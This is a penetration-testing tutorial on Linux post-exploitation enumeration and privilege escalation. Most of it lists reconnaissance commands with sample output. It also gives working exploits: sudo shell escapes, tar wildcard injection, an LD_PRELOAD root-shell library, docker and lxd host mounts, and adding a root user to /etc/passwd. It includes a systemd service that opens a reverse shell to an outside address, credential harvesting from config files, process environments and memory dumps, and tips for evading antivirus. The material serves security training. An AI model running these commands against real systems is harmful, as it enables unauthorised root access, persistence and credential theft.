# Local Environment Enumeration

### Overview

**Linux Local Environment Enumeration** is the systematic process of gathering information about a Linux system after gaining initial access. This reconnaissance phase is critical for identifying privilege escalation vectors, understanding the system's security posture, discovering sensitive information, and planning lateral movement within a network.

Effective enumeration follows a methodical approach: examining user context, reviewing system configuration, analyzing running services, inspecting file permissions, checking for security misconfigurations, and identifying potential privilege escalation paths. The goal is to paint a complete picture of the target system to determine the best path forward in a penetration test or security assessment.

**Key Concepts:**

* **User Context** - Understanding your current privileges and limitations
* **SUID/SGID Binaries** - Files that execute with elevated privileges
* **Kernel Exploits** - Vulnerabilities in the Linux kernel that allow privilege escalation
* **Sudo Misconfigurations** - Improper sudo rules that can be abused
* **Cron Jobs** - Scheduled tasks that may run with elevated privileges
* **Writable Paths** - Directories and files that can be modified for exploitation

**Why Enumeration Matters:**

* Identifies the fastest path to privilege escalation
* Reveals security misconfigurations and vulnerabilities
* Discovers sensitive data (credentials, keys, configuration files)
* Maps the network environment and connected systems
* Helps avoid detection by understanding monitoring mechanisms

**Common Post-Exploitation Goals:**

* Escalate privileges to root
* Establish persistent access
* Extract credentials and sensitive data
* Move laterally to other systems
* Exfiltrate valuable information

***

### Exploitation Workflow Summary

1. Initial Situational Awareness ├─ Identify current user and privileges ├─ Determine system information (OS, kernel, architecture) ├─ Check network configuration └─ Identify active connections
2. User and Group Enumeration ├─ List all users and groups ├─ Identify privileged users ├─ Check sudo permissions └─ Review user home directories
3. System Configuration Analysis ├─ Examine running services ├─ Review scheduled tasks (cron) ├─ Check installed applications └─ Analyze startup scripts
4. File System Reconnaissance ├─ Find SUID/SGID binaries ├─ Search for writable files and directories ├─ Locate configuration files └─ Hunt for credentials and sensitive data
5. Network and Process Investigation ├─ Map network interfaces and routes ├─ Identify listening services ├─ Enumerate running processes └─ Check for internal services

***

### Phase 1: Initial Situational Awareness

#### Understanding Your Context

Before diving deep into enumeration, establish basic situational awareness: who you are, where you are, and what privileges you have.

#### Current User Information

**Check current username:**

```bash
whoami
```

**Expected output:**

```
www-data
```

**View user ID and group memberships:**

```bash
id
```

**Expected output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(developers)
```

**Parameters explained:**

* `uid` - User ID (33 is typically www-data)
* `gid` - Primary group ID
* `groups` - All groups user belongs to

**Why this matters:** Group memberships like "docker", "lxd", "sudo", or "disk" can provide direct privilege escalation paths.

**Check command history:**

```bash
history
cat ~/.bash_history
cat ~/.zsh_history
```

**Expected output:**

```
1  sudo su
2  mysql -u root -p
3  ssh admin@192.168.1.10
4  cat /etc/shadow
```

**Why this matters:** Command history often contains credentials, IP addresses, and administrative commands that reveal how the system is managed.

#### System Information

**Display system information:**

```bash
uname -a
```

**Expected output:**

```
Linux webserver 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

**Parameters explained:**

* `4.15.0-45-generic` - Kernel version (critical for kernel exploit identification)
* `x86_64` - 64-bit architecture
* `Ubuntu` - Distribution information

**Check distribution details:**

```bash
cat /etc/os-release
```

**Expected output:**

```
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.2 LTS"
VERSION_ID="18.04"
```

**Alternative commands:**

```bash
# For Red Hat based systems
cat /etc/redhat-release

# For Debian based systems
cat /etc/issue

# Distribution-agnostic
lsb_release -a
```

**Check kernel version (for exploit research):**

```bash
cat /proc/version
```

**Expected output:**

```
Linux version 4.15.0-45-generic (buildd@lgw01-amd64-051) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019
```

**Why this matters:** Old kernel versions often have public exploits. Search for: "Linux kernel 4.15.0 exploit"

**Check system architecture:**

```bash
arch
# or
uname -m
```

**Expected output:**

```
x86_64
```

**Possible values:**

* `x86_64` - 64-bit Intel/AMD
* `i686` - 32-bit Intel/AMD
* `armv7l` - 32-bit ARM
* `aarch64` - 64-bit ARM

#### Hostname and Domain Information

**Display hostname:**

```bash
hostname
```

**Expected output:**

```
webserver-prod-01
```

**Check fully qualified domain name:**

```bash
hostname -f
```

**Expected output:**

```
webserver-prod-01.company.local
```

**View DNS configuration:**

```bash
cat /etc/resolv.conf
```

**Expected output:**

```
nameserver 10.0.0.1
nameserver 8.8.8.8
search company.local
```

**Why this matters:** Domain information reveals corporate network structure and potential targets for lateral movement.

***

### Phase 2: User and Group Enumeration

#### Understanding User Accounts

**List all users:**

```bash
cat /etc/passwd
```

**Expected output:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
john:x:1000:1000:John Doe:/home/john:/bin/bash
admin:x:1001:1001:Admin User:/home/admin:/bin/bash
```

**Format explained:**

```
username:password:UID:GID:comment:home_directory:shell
```

**Key fields:**

* `UID 0` - Root user (all UID 0 accounts have root privileges)
* Shell ending in `/nologin` or `/false` - Service accounts, can't login interactively
* `/bin/bash` or `/bin/sh` - Interactive login accounts (potential targets)

**Extract only users with login shells:**

```bash
cat /etc/passwd | grep -v "nologin\|false"
```

**Expected output:**

```
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:John Doe:/home/john:/bin/bash
admin:x:1001:1001:Admin User:/home/admin:/bin/bash
```

**Find users with UID 0 (root privileges):**

```bash
awk -F: '($3 == "0") {print}' /etc/passwd
```

**Expected output:**

```
root:x:0:0:root:/root:/bin/bash
```

**Why this matters:** Multiple UID 0 accounts could indicate backdoors or misconfigurations.

#### Group Memberships

**List all groups:**

```bash
cat /etc/group
```

**Expected output:**

```
root:x:0:
sudo:x:27:john,admin
docker:x:999:john
lxd:x:998:john
```

**Critical groups to check:**

* `sudo` - Can execute commands as root
* `wheel` - Can execute commands as root (Red Hat)
* `docker` - Can spawn privileged containers
* `lxd` - Can spawn privileged containers
* `disk` - Can read/write raw disk devices
* `adm` - Can read log files
* `shadow` - Can read /etc/shadow

**Check users in sudo group:**

```bash
getent group sudo
```

**Expected output:**

```
sudo:x:27:john,admin
```

**Check users in docker group:**

```bash
getent group docker
```

**Expected output:**

```
docker:x:999:john
```

**Why this matters:** Being in docker/lxd group provides direct root escalation paths.

#### Sudo Configuration

**Check sudo permissions:**

```bash
sudo -l
```

**Expected output (vulnerable):**

```
User www-data may run the following commands on webserver:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /home/admin/backup.sh
```

**Why this is vulnerable:**

* `find`, `vim` - Have known privilege escalation methods
* `NOPASSWD` - No password required
* `(ALL)` - Can run as any user
* Custom scripts may be writable or exploitable

**Check if password is required:**

```bash
sudo -l -U username
```

**Read sudoers file (if accessible):**

```bash
cat /etc/sudoers
cat /etc/sudoers.d/*
```

**Expected output:**

```
# User privilege specification
root    ALL=(ALL:ALL) ALL
john    ALL=(ALL) NOPASSWD: /usr/bin/apt-get
%sudo   ALL=(ALL:ALL) ALL
```

#### Home Directories

**List all home directories:**

```bash
ls -la /home/
```

**Expected output:**

```
drwxr-xr-x  5 john    john    4096 Dec 20 10:00 john
drwxr-xr-x  3 admin   admin   4096 Dec 19 14:30 admin
drwxrwxrwx  2 backup  backup  4096 Dec 18 09:00 backup
```

**Why this matters:** World-writable home directories (rwxrwxrwx) are security issues.

**Search for interesting files in home directories:**

```bash
find /home/ -type f -name "*.txt" -o -name "*.pdf" -o -name "*.doc" 2>/dev/null
find /home/ -type f -name ".*history" 2>/dev/null
find /home/ -type f -name ".*rc" 2>/dev/null
```

**Look for SSH keys:**

```bash
find /home/ -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
```

**Expected output:**

```
/home/john/.ssh/id_rsa
/home/admin/.ssh/backup_key.pem
```

**Why this matters:** Private SSH keys allow authentication to other systems without passwords.

***

### Phase 3: System Configuration Analysis

#### Running Services

**List all running services (systemd):**

```bash
systemctl list-units --type=service --state=running
```

**Expected output:**

```
UNIT                           LOAD   ACTIVE SUB     DESCRIPTION
apache2.service               loaded active running The Apache HTTP Server
mysql.service                 loaded active running MySQL Community Server
ssh.service                   loaded active running OpenBSD Secure Shell server
```

**Alternative method (SysV init):**

```bash
service --status-all
```

**Expected output:**

```
 [ + ]  apache2
 [ - ]  apparmor
 [ + ]  cron
 [ + ]  mysql
 [ + ]  networking
 [ + ]  ssh
```

**Legend:**

* `[ + ]` - Service is running
* `[ - ]` - Service is stopped
* `[ ? ]` - Status unknown

**Check service details:**

```bash
systemctl status apache2.service
```

**Expected output:**

```
● apache2.service - The Apache HTTP Server
   Loaded: loaded (/lib/systemd/system/apache2.service; enabled)
   Active: active (running) since Mon 2025-12-20 10:00:00 UTC; 2h ago
   Main PID: 1234 (apache2)
    Tasks: 55
   CGroup: /system.slice/apache2.service
           ├─1234 /usr/sbin/apache2 -k start
           ├─1235 /usr/sbin/apache2 -k start
```

**Why this matters:** Services running as root or with misconfigurations can be exploited for privilege escalation.

#### Scheduled Tasks (Cron Jobs)

**Check current user's crontab:**

```bash
crontab -l
```

**Expected output:**

```
# m h  dom mon dow   command
0 * * * * /home/user/backup.sh
30 2 * * * /usr/local/bin/cleanup.py
```

**View system-wide cron jobs:**

```bash
ls -la /etc/cron*
```

**Expected output:**

```
-rw-r--r-- 1 root root  722 Apr  5  2019 /etc/crontab

/etc/cron.d:
-rw-r--r-- 1 root root  102 Nov 16  2017 .placeholder
-rw-r--r-- 1 root root  285 May 29  2017 php

/etc/cron.daily:
-rwxr-xr-x 1 root root  311 May 29  2017 0anacron
-rwxr-xr-x 1 root root 1478 Apr 20  2018 apt-compat
-rwxrwxrwx 1 root root  123 Dec 20 10:00 backup
```

**Read system crontab:**

```bash
cat /etc/crontab
```

**Expected output:**

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
```

**Look for writable cron scripts:**

```bash
find /etc/cron* -type f -writable 2>/dev/null
```

**Expected output:**

```
/etc/cron.daily/backup
```

**Why this matters:** Writable cron scripts that run as root can be modified to execute arbitrary commands with root privileges.

**Check for user-specific cron jobs:**

```bash
cat /var/spool/cron/crontabs/*
```

#### Installed Software and Packages

**List installed packages (Debian/Ubuntu):**

```bash
dpkg -l
```

**List installed packages (Red Hat/CentOS):**

```bash
rpm -qa
```

**Search for specific software:**

```bash
dpkg -l | grep -i mysql
dpkg -l | grep -i apache
dpkg -l | grep -i python
```

**Find recently installed packages:**

```bash
# Debian/Ubuntu
grep " install " /var/log/dpkg.log

# Red Hat/CentOS
grep "Installed" /var/log/yum.log
```

**Check for outdated packages:**

```bash
apt list --upgradable
```

**Why this matters:** Outdated software may have known vulnerabilities with public exploits.

#### Startup Scripts and Init

**List systemd services:**

```bash
systemctl list-unit-files --type=service
```

**Check for writable service files:**

```bash
find /etc/systemd/system -writable -type f 2>/dev/null
find /lib/systemd/system -writable -type f 2>/dev/null
```

**Examine rc.local (legacy startup script):**

```bash
cat /etc/rc.local
```

**Check init.d scripts:**

```bash
ls -la /etc/init.d/
```

**Look for writable init scripts:**

```bash
find /etc/init.d/ -writable -type f 2>/dev/null
```

***

### Phase 4: File System Reconnaissance

#### SUID and SGID Binaries

**Understanding SUID/SGID:**

* **SUID (Set User ID)** - File executes with owner's privileges
* **SGID (Set Group ID)** - File executes with group's privileges
* If owned by root, these files run as root when executed

**Find all SUID binaries:**

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Expected output:**

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/vim.basic
/usr/local/bin/custom-app
```

**Parameters explained:**

* `/` - Search from root directory
* `-perm -4000` - Find files with SUID bit set
* `-type f` - Only files, not directories
* `2>/dev/null` - Suppress error messages

**Find all SGID binaries:**

```bash
find / -perm -2000 -type f 2>/dev/null
```

**Find both SUID and SGID:**

```bash
find / -perm -6000 -type f 2>/dev/null
```

**Detailed SUID search with permissions:**

```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

**Expected output:**

```
-rwsr-xr-x 1 root root  63568 Jan 10  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 146128 Nov 29  2018 /usr/bin/sudo
-rwsr-xr-x 1 root root 320160 Feb 16  2019 /usr/bin/find
```

**Why SUID binaries are important:**

* Common SUID exploits: find, vim, nano, cp, mv, bash, python
* Custom binaries often have vulnerabilities
* Can be used for privilege escalation

**Check known vulnerable SUID binaries:**

```bash
# Check if these exist as SUID
ls -la /usr/bin/find /usr/bin/vim /usr/bin/nano /usr/bin/nmap 2>/dev/null | grep rws
```

#### World-Writable Directories and Files

**Find world-writable directories:**

```bash
find / -type d -perm -0002 -not -path "/proc/*" 2>/dev/null
```

**Expected output:**

```
/tmp
/var/tmp
/dev/shm
/home/backup
/var/www/uploads
```

**Why this matters:** World-writable directories can be used to:

* Plant malicious scripts
* Store payloads
* Modify configuration files
* Replace legitimate binaries

**Find world-writable files:**

```bash
find / -type f -perm -0002 -not -path "/proc/*" 2>/dev/null
```

**Find files writable by current user:**

```bash
find / -writable -type f 2>/dev/null | grep -v "^/proc" | grep -v "^/sys"
```

**Find writable configuration files:**

```bash
find /etc -writable -type f 2>/dev/null
```

**Expected output:**

```
/etc/passwd
/etc/shadow
/etc/crontab
```

**Why this is critical:** Writable /etc/passwd or /etc/shadow allows adding users with root privileges.

#### Sensitive File Discovery

**Search for configuration files:**

```bash
find / -name "*.conf" -type f 2>/dev/null
find /etc -name "*.conf" -type f 2>/dev/null
```

**Look for database configuration:**

```bash
find / -name "database.yml" -o -name "config.php" -o -name "db.config" 2>/dev/null
```

**Search for credential files:**

```bash
find / -name "credentials" -o -name "password" -o -name "*.key" 2>/dev/null
```

**Look for backup files:**

```bash
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" 2>/dev/null
```

**Search for scripts:**

```bash
find / -name "*.sh" -type f 2>/dev/null
find / -name "*.py" -type f 2>/dev/null
```

**Search file contents for passwords:**

```bash
grep -r "password" /etc/ 2>/dev/null
grep -r "PRIVATE KEY" /home/ 2>/dev/null
grep -r "api_key" /var/www/ 2>/dev/null
```

**Expected output:**

```
/etc/mysql/my.cnf:password=SuperSecret123
/var/www/html/config.php:$db_password = "P@ssw0rd";
/home/admin/.env:API_KEY=abc123def456
```

**Search for SSH keys:**

```bash
find / -name "authorized_keys" 2>/dev/null
find / -name "id_rsa*" -o -name "id_dsa*" -o -name "id_ecdsa*" -o -name "id_ed25519*" 2>/dev/null
```

#### Log Files

**Common log file locations:**

```bash
ls -la /var/log/
```

**Expected output:**

```
-rw-r----- 1 syslog adm     15680 Dec 20 12:00 auth.log
-rw-r----- 1 syslog adm    128456 Dec 20 12:05 syslog
-rw-r----- 1 root   adm     45231 Dec 20 11:30 apache2/access.log
```

**Read authentication logs:**

```bash
cat /var/log/auth.log
cat /var/log/secure  # Red Hat/CentOS
```

**Why this matters:** Auth logs contain:

* SSH login attempts with usernames
* sudo command history
* Authentication failures revealing user enumeration
* Timing of administrative actions

**Check Apache/Nginx access logs:**

```bash
cat /var/log/apache2/access.log
cat /var/log/nginx/access.log
```

**Search logs for credentials:**

```bash
grep -i "password" /var/log/*.log 2>/dev/null
grep -i "username" /var/log/*.log 2>/dev/null
```

***

### Phase 5: Network and Process Investigation

#### Network Configuration

**Display network interfaces:**

```bash
ifconfig
# or modern alternative
ip addr show
```

**Expected output:**

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.15  netmask 255.255.255.0  broadcast 10.0.0.255
        inet6 fe80::a00:27ff:fe8d:c04d  prefixlen 64
        ether 08:00:27:8d:c0:4d  txqueuelen 1000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
```

**Why this matters:**

* Multiple interfaces suggest dual-homed system (potential pivot point)
* IP addresses reveal network segmentation
* Can identify internal networks for lateral movement

**View routing table:**

```bash
route -n
# or
ip route show
```

**Expected output:**

```
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.1        0.0.0.0         UG    0      0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
192.168.1.0     10.0.0.254      255.255.255.0   UG    0      0        0 eth0
```

**Why this matters:** Additional routes reveal internal networks accessible from this host.

**Check ARP cache:**

```bash
arp -a
# or
ip neigh show
```

**Expected output:**

```
? (10.0.0.1) at 08:00:27:12:34:56 [ether] on eth0
? (10.0.0.20) at 08:00:27:ab:cd:ef [ether] on eth0
? (10.0.0.50) at 08:00:27:98:76:54 [ether] on eth0
```

**Why this matters:** Reveals recently communicated hosts on local network.

#### Active Network Connections

**Show all listening ports:**

```bash
netstat -tulnp
```

**Parameters explained:**

* `-t` - TCP connections
* `-u` - UDP connections
* `-l` - Listening ports
* `-n` - Numeric addresses (no DNS resolution)
* `-p` - Show process/PID

**Expected output:**

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1234/sshd
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      5678/mysqld
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      9012/apache2
```

**Why this matters:**

* Services on 127.0.0.1 (localhost only) might not be firewalled
* Can pivot through system to access internal services
* Identifies services that might be exploitable

**Modern alternative (ss command):**

```bash
ss -tulnp
```

**Show established connections:**

```bash
netstat -antp
```

**Expected output:**

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 10.0.0.15:22            10.0.0.5:54321          ESTABLISHED 1234/sshd
tcp        0    284 10.0.0.15:80            192.168.1.100:49832     ESTABLISHED 9012/apache2
```

**Why this matters:** Shows active connections, potential for session hijacking or monitoring.

#### Running Processes

**List all processes:**

```bash
ps aux
```

**Expected output:**

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 225868  9340 ?        Ss   10:00   0:02 /sbin/init
root       823  0.0  0.2 170520 12208 ?        Ss   10:00   0:00 /usr/sbin/sshd -D
mysql     1234  0.5  5.2 1580028 424412 ?      Ssl  10:00   1:23 /usr/sbin/mysqld
www-data  5678  0.0  0.3 356248 28412 ?        S    10:30   0:01 /usr/sbin/apache2
```

**Parameters explained:**

* `a` - All users' processes
* `u` - User-oriented format
* `x` - Include processes without controlling terminal

**Search for specific processes:**

```bash
ps aux | grep root
ps aux | grep mysql
```

**View process tree:**

```bash
ps auxf
# or
pstree -p
```

**Expected output:**

```
systemd(1)─┬─apache2(5678)─┬─apache2(5679)
           │                ├─apache2(5680)
           │                └─apache2(5681)
           ├─mysqld(1234)
           └─sshd(823)───sshd(9012)───bash(9013)
```

**Why this matters:**

* Processes running as root are exploitation targets
* Long-running processes may have memory containing credentials
* Parent-child relationships reveal service dependencies

**Check process command lines:**

```bash
ps auxww | grep -v grep
```

**Look for processes with passwords in command line:**

```bash
ps auxww | grep -i "password\|pass\|pwd"
```

**Expected output:**

```
root      5432  0.0  0.1  12345  2345 ?  S  10:00  0:00 mysql -u root -pSuperSecret123
```

**Why this is dangerous:** Passwords in command line are visible to all users.

#### Memory and CPU Information

**Check memory usage:**

```bash
free -h
```

**Expected output:**

```
              total        used        free      shared  buff/cache   available
Mem:           7.8G        2.3G        1.2G        156M        4.3G        5.2G
Swap:          2.0G          0B        2.0G
```

**Check CPU information:**

```bash
cat /proc/cpuinfo | grep "model name" | head -1
```

**Expected output:**

```
model name	: Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz
```

**Check system uptime:**

```bash
uptime
```

**Expected output:**

```
 12:30:15 up 2 days,  2:30,  3 users,  load average: 0.45, 0.32, 0.28
```

**Why this matters:** Long uptimes suggest system hasn't been patched recently.

***

### Automated Enumeration Tools

#### LinPEAS (Linux Privilege Escalation Awesome Script)

**What it does:** Comprehensive automated enumeration script that checks for privilege escalation vectors.

**Download and execute:**

```bash
# Download
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Make executable
chmod +x linpeas.sh

# Execute
./linpeas.sh
```

**Execute from memory (no file on disk):**

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Key sections LinPEAS checks:**

* SUID binaries
* Sudo misconfigurations
* Writable files and directories
* Cron jobs
* Kernel vulnerabilities
* Network information
* Interesting files

#### Linux Smart Enumeration (LSE)

**What it does:** Lighter alternative to LinPEAS with colored output for easy reading.

**Download and execute:**

```bash
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
chmod +x lse.sh
./lse.sh -l 1  # Level 1 (basic)
./lse.sh -l 2  # Level 2 (detailed)
```

**Parameters explained:**

* `-l 1` - Basic enumeration (fast)
* `-l 2` - Detailed enumeration (comprehensive)
* `-i` - Non-interactive mode

#### LinEnum

**What it does:** Popular enumeration script that outputs to terminal or file.

**Execute:**

```bash
./LinEnum.sh -t  # Thorough tests
./LinEnum.sh -r report.txt  # Save to file
```

#### Manual Enumeration (No Tools)

**One-liner comprehensive check:**

```bash
echo "=== USER INFO ===" && id && echo "=== SUDO ===" && sudo -l 2>/dev/null && echo "=== SUID ===" && find / -perm -4000 -type f 2>/dev/null && echo "=== CRON ===" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron* 2>/dev/null
```

**Why manual enumeration matters:**

* Automated tools may be detected by AV/EDR
* Some environments don't allow script execution
* Manual checking builds understanding
* Can be more stealthy

***

### Common Privilege Escalation Vectors

#### Kernel Exploits

**Check kernel version:**

```bash
uname -r
```

**Search for kernel exploits:**

```bash
# Use searchsploit (if Kali)
searchsploit "linux kernel 4.15"

# Or manually search exploit-db
```

**Common kernel exploits:**

* **DirtyCOW (CVE-2016-5195)** - Kernel 2.6.22 - 4.8.3
* **DirtyPipe (CVE-2022-0847)** - Kernel 5.8 - 5.16.11
* **PwnKit (CVE-2021-4034)** - Polkit before 0.120
* **Baron Samedit (CVE-2021-3156)** - Sudo before 1.9.5p2

**Verify exploit compatibility:**

```bash
# Check exact kernel version
uname -a

# Check if vulnerable package is installed
dpkg -l | grep sudo
rpm -qa | grep sudo
```

#### Sudo Exploitation

**Common sudo misconfigurations:**

**1. NOPASSWD with exploitable binaries:**

```bash
# If sudo -l shows:
(root) NOPASSWD: /usr/bin/vim

# Exploit:
sudo vim -c ':!/bin/bash'
```

**2. Wildcard injection:**

```bash
# If sudo -l shows:
(root) NOPASSWD: /usr/bin/tar -czf /backup/*.tar.gz *

# Exploit:
cd /tmp
echo "chmod +s /bin/bash" > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
sudo tar -czf /backup/backup.tar.gz *
```

**3. LD\_PRELOAD exploitation:**

```bash
# If sudo -l shows: env_keep+=LD_PRELOAD

# Create malicious library
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

#### Docker/LXD Group Membership

**If user is in docker group:**

```bash
# Check membership
id | grep docker

# Exploit - mount host filesystem
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

**If user is in lxd group:**

```bash
# Check membership
id | grep lxd

# Exploit (requires lxd image)
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
cd /mnt/root/root
```

#### Writable /etc/passwd

**If /etc/passwd is writable:**

```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt xyz password123

# Add root user
echo 'hacker:$1$xyz$RKYDTz8mLCiXmCnhT.DXNQ.:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
# Password: password123
```

#### Writable Service Files

**If systemd service file is writable:**

```bash
# Find writable service
find /etc/systemd/system -writable -type f 2>/dev/null

# Modify service to execute reverse shell
echo '[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/vulnerable.service

# Reload and start
systemctl daemon-reload
systemctl start vulnerable.service
```

***

### Credential Hunting

#### Configuration Files

**Common locations for credentials:**

```bash
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat ~/.aws/credentials
cat ~/.ssh/config
cat ~/. bash_history | grep -i "password\|pass"
```

#### Database Credentials

**MySQL configuration:**

```bash
cat /etc/mysql/my.cnf
cat ~/.my.cnf
```

**PostgreSQL configuration:**

```bash
cat /var/lib/postgresql/data/postgresql.conf
cat ~/.pgpass
```

**MongoDB configuration:**

```bash
cat /etc/mongod.conf
```

#### Environment Variables

**Check environment:**

```bash
env
printenv
cat /proc/*/environ 2>/dev/null
```

**Expected output:**

```
PATH=/usr/local/bin:/usr/bin
DB_PASSWORD=SuperSecret123
API_KEY=abc123def456
AWS_SECRET_KEY=xyz789
```

#### Memory Dumping

**Dump process memory (if possible):**

```bash
# Requires gdb installed
gdb -p [PID]
(gdb) generate-core-file
(gdb) quit

# Search for strings in core dump
strings core.[PID] | grep -i "password"
```

***

### Troubleshooting

#### Permission Denied Errors

**Problem:** Many enumeration commands return "Permission denied"

**Solution:**

```bash
# Add 2>/dev/null to suppress errors
find / -perm -4000 -type f 2>/dev/null

# Focus on accessible directories
find /home /var /tmp -perm -4000 -type f 2>/dev/null

# Check what you CAN access
find / -readable -type f 2>/dev/null | head -100
```

**Why it works:** Focusing on accessible areas is more efficient than searching everything.

#### Enumeration Scripts Detected

**Problem:** LinPEAS or other scripts are detected and blocked by antivirus

**Solution:**

```bash
# Use manual enumeration instead
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab

# Or execute in memory without touching disk
curl -L URL | sh
```

**Why it works:** Manual commands are harder to detect than known tool signatures.

#### No Network Access

**Problem:** Cannot download enumeration scripts

**Solution:**

```bash
# Upload scripts through established shell
# Base64 encode on attacker machine
base64 linpeas.sh > linpeas.b64

# Transfer and decode on target
echo "[base64 content]" | base64 -d > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Why it works:** Base64 encoding allows transfer through text-only channels.

#### Limited Shell Environment

**Problem:** Restricted shell or minimal binaries available

**Solution:**

```bash
# Escape restricted shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Or try other languages
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'

# If nothing works, use echo
echo $PATH
echo $SHELL
echo $HOME
```

**Why it works:** Spawning a proper shell from scripting languages bypasses restrictions.

#### Cannot Find SUID Binaries

**Problem:** Find command doesn't locate any interesting SUID binaries

**Solution:**

```bash
# Search in specific common locations
ls -la /usr/bin/ /usr/sbin/ /usr/local/bin/ | grep rws

# Check custom application directories
ls -la /opt/*/bin/ | grep rws
ls -la /home/*/bin/ | grep rws

# Use alternative search
find /usr -perm -4000 -ls 2>/dev/null
```

**Why it works:** Sometimes searching specific locations is faster and finds custom installations.

***

### Quick Reference

#### Essential Commands

```bash
# User context
whoami && id && hostname

# System info
uname -a && cat /etc/os-release

# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Network info
ip addr show && netstat -tulnp

# Running processes
ps aux | grep root
```

#### Credential Hunting

```bash
# Configuration files
find / -name "*.conf" -type f 2>/dev/null | grep -v "^/proc"

# Search for passwords
grep -r "password" /etc /var /home 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null

# History files
cat ~/.bash_history ~/.mysql_history ~/.psql_history 2>/dev/null
```

#### Privilege Escalation Checks

```bash
# Writable /etc/passwd
ls -la /etc/passwd

# Cron jobs
cat /etc/crontab && ls -la /etc/cron*

# Docker/LXD membership
id | grep -E "docker|lxd"

# Kernel version
uname -r
```

#### Network Enumeration

```bash
# Interfaces and IPs
ip addr show

# Routing
ip route show

# Listening services
ss -tulnp

# Active connections
netstat -antp
```
